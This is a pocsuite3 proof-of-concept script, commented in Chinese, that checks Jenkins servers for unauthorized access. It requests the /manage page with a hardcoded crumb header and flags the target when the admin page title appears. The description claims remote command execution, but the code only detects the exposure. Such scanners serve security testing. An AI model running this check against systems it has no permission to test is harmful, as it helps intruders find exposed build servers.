from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
import requests
requests.packages.urllib3.disable_warnings()


class JenkinsPOC(POCBase):
    vulID = ""  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "Ninggo"  # PoC作者的大名
    vulDate = "2022-7-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-17"  # 编写 PoC 的日期
    updateDate = "2022-7-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.jenkins.io"]  # 漏洞地址来源,0day不用写
    name = "jenkins未授权访问POC"  # PoC 名称
    appPowerLink = "https://www.jenkins.io"  # 漏洞厂商主页地址
    appName = "jenkins未授权访问漏洞"  # 漏洞应用名称
    appVersion = "2.332.2"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            java语言开发，用于监控持续重复的工作，包括：持续的软件版本发布/测试项目，监控外部调用执行的工作。
        """  # 漏洞简要描述
    pocDesc = """
            检测未授权访问从而利用实现远程命令执行。
        """  # POC用法描述

    # 漏洞检测方法
    def _check(self):
        result = []
        url1 = f"{self.url}/manage"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                   "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Accept-Encoding": "gzip, deflate", "Referer": f"{self.url}/manage",
                   "X-Requested-With": "XMLHttpRequest", "X-Prototype-Version": "1.7",
                   "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "Jenkins-Crumb": "cf42bf61b2b1206e421f25a5487a96eea6f8780bf1745effd59993c88465eaa6",
                   "Origin": f"{self.url}", "Connection": "close"}

        try:
            response = requests.get(url1, headers=headers,allow_redirects=False, verify=False,timeout=5)
            if response.status_code == 200 and "Manage Jenkins [Jenkins]" in response.text:
                result.append(self.url)
        except Exception:
             pass
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            # 这些信息会在终端上显示
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()
        # 攻击模式即重新调用_verify方法

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

def other_fuc():
    pass

# 未知功能

def other_utils_func():
    pass

# 未知功能

# 注册 DemoPOC 类,必须保留并注册
register_poc(JenkinsPOC)
